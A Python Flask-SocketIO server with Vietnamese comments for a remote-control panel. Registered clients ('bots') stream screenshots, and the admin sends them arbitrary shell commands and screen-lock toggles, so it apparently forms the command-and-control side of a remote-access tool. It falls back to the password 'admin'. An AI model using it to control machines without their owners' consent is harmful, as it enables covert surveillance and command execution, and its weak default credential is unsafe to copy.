# --- START OF FILE: server.py ---

import eventlet
eventlet.monkey_patch()

import os
from flask import Flask, render_template, request, session, redirect, url_for
from flask_socketio import SocketIO, emit, join_room
import logging

# Giảm bớt log không cần thiết trên console
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
# SECRET_KEY rất QUAN TRỌNG cho việc quản lý session đăng nhập
app.config['SECRET_KEY'] = os.urandom(24) 
socketio = SocketIO(app, async_mode='eventlet')

# === Biến toàn cục ===
connected_clients = {}  # { client_id: {'sid': sid, ...} }
sid_to_client_id = {}   # { sid: client_id } - Dictionary tra cứu ngược để tăng tốc độ
ADMIN_ROOM = 'admin_subscribers'
# Lấy mật khẩu từ biến môi trường của Render. Nếu không có, dùng mật khẩu mặc định 'admin'
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin')

# === HTTP Routes ===

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        password = request.form.get('password')
        if password == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('admin_panel'))
        else:
            error = 'ACCESS KEY INVALID'
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/')
def admin_panel():
    """Trang Dashboard chính, yêu cầu đăng nhập."""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('admin.html')

# === Socket.IO Events ===
def update_admins_client_list():
    """Hàm phụ trợ, gửi danh sách client cập nhật tới tất cả admin."""
    client_ids = list(connected_clients.keys())
    socketio.emit('update_client_list', client_ids, to=ADMIN_ROOM)

@socketio.on('connect')
def handle_connect():
    # Chỉ cho phép admin đã đăng nhập kết nối Socket.IO từ trình duyệt
    # Client thật (bot) không dùng session nên sẽ không bị ảnh hưởng
    is_client = request.sid in sid_to_client_id
    if not session.get('logged_in') and not is_client:
        return False # Từ chối kết nối socket từ trình duyệt chưa đăng nhập
    pass

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    if sid in sid_to_client_id:
        client_id_to_remove = sid_to_client_id[sid]
        del sid_to_client_id[sid]
        if client_id_to_remove in connected_clients:
            del connected_clients[client_id_to_remove]
        print(f"[SERVER] Client disconnected: {client_id_to_remove}")
        update_admins_client_list()

@socketio.on('register_client')
def handle_client_registration(data):
    client_id = data.get('id')
    if client_id:
        sid = request.sid
        # Xóa client cũ nếu có cùng ID (trường hợp client kết nối lại)
        for old_sid, old_cid in list(sid_to_client_id.items()):
            if old_cid == client_id:
                del sid_to_client_id[old_sid]
                if client_id in connected_clients:
                     del connected_clients[client_id]
                break

        connected_clients[client_id] = {'sid': sid}
        sid_to_client_id[sid] = client_id
        print(f"[SERVER] Client registered: {client_id}")
        update_admins_client_list()

@socketio.on('screen_update')
def handle_screen_update(data):
    client_id = data.get('id')
    image_data = data.get('image')
    if client_id in connected_clients:
        socketio.emit('new_frame', {'client_id': client_id, 'image': image_data}, to=ADMIN_ROOM)

@socketio.on('execute_command')
def handle_execute_command(data):
    if not session.get('logged_in'): return
    client_id = data.get('client_id')
    command = data.get('command')
    if client_id in connected_clients:
        target_sid = connected_clients[client_id]['sid']
        socketio.emit('run_command', {'command': command}, to=target_sid)

@socketio.on('command_result')
def handle_command_result(data):
    client_id = data.get('client_id')
    if client_id in connected_clients:
        socketio.emit('command_result', {'client_id': client_id, 'output': data.get('output')}, to=ADMIN_ROOM)

@socketio.on('subscribe_to_admin_updates')
def handle_admin_subscription():
    if not session.get('logged_in'):
        return # Không cho phép subscribe nếu chưa đăng nhập
    join_room(ADMIN_ROOM)
    emit('update_client_list', list(connected_clients.keys()))

@socketio.on('toggle_lock_screen')
def handle_toggle_lock(data):
    if not session.get('logged_in'): return
    client_id = data.get('client_id')
    lock_state = data.get('lock_state') # True để bật, False để tắt
    if client_id in connected_clients:
        target_sid = connected_clients[client_id]['sid']
        print(f"[SERVER] Setting lock state for {client_id} to {lock_state}")
        socketio.emit('set_lock_state', {'lock': lock_state}, to=target_sid)

# --- END OF FILE: server.py ---
